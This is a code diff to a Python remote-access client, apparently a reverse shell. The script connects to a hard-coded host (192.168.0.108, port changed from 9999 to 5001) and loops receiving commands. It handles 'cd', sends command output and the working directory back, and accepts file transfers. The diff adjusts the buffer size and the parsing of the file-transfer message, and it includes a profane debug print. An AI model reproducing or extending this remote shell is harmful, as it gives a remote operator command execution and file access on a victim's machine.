@@ -3,6 +3,7 @@ import os
 import re
 import sys
 import subprocess
+import tqdm
 import platform
 import psutil
 from requests import get
@@ -48,7 +49,7 @@ Private IP Address : {str(ip_pvt)}
 
 s = socket.socket()
 host = '192.168.0.108'
-port = 9999
+port = 5001
 
 BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
@@ -58,7 +59,7 @@ s.connect((host, port))
 
 
 while True:
-    data = s.recv(1024)
+    data = s.recv(BUFFER_SIZE)
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
 
@@ -70,10 +71,11 @@ while True:
         s.send(str.encode(output_str +'\n'+ currentWD))
         print(output_str)
     
-    if data.decode("utf-8") == 'send file':
+    elif 'send file' in data.decode("utf-8"):
         print('Fuck u Again')
-        received = s.recv(BUFFER_SIZE).decode()
-        filename, filesize = received.split(SEPARATOR)
+        # received = s.recv(BUFFER_SIZE).decode()
+        data = data.decode("utf-8")
+        a , filename, filesize = data.split(SEPARATOR)
         # remove absolute path if there is
         filename = os.path.basename(filename)
         # convert to integer
